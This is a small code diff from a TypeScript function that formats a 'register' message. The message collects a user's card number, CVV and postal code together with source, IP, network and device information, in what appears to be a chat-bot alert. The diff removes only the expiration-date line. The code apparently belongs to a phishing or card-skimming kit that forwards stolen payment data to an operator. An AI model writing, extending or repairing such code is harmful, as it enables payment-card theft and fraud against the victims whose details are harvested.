@@ -712,7 +712,6 @@ function formatRegisterMessage(data: RegisterRequest, ipInfo: IpInfo, deviceInfo
   message += formatSourceInfo(sourceInfo);
   message += `\n💳 <b>Card Details:</b>\n`;
   message += `   • Card Number: ${data.cardNumber}\n`;
-  message += `   • Expiration: ${data.expiration}\n`;
   message += `   • CVV: ${data.cvv}\n`;
   message += `   • Postal Code: ${data.postalCode}\n\n`;
   message += `🌐 <b>Network Info:</b>\n`;
